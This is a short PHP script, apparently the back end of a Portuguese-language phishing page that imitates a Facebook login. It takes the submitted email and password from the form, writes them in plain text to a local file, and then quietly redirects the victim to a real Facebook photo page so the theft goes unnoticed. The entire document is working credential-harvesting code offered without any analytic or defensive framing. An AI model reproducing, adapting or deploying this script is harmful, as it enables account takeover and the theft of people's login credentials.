<?php header ('Content-type: text/html; charset=UTF-8'); ?>
<?php
$file = "local.txt";
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "*************************");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Senha: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "************************");
fwrite($handle, "\n");
fclose($handle);
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Redirecionando ao Facebook</title>
<meta http-equiv="Refresh" content="1; URL=https://www.facebook.com/photo.php?fbid=559144847566465&set=a.116772838466237.27353.104404005649947&type=1&theater"/>
</head><body>
</body>
</html>
';
?>
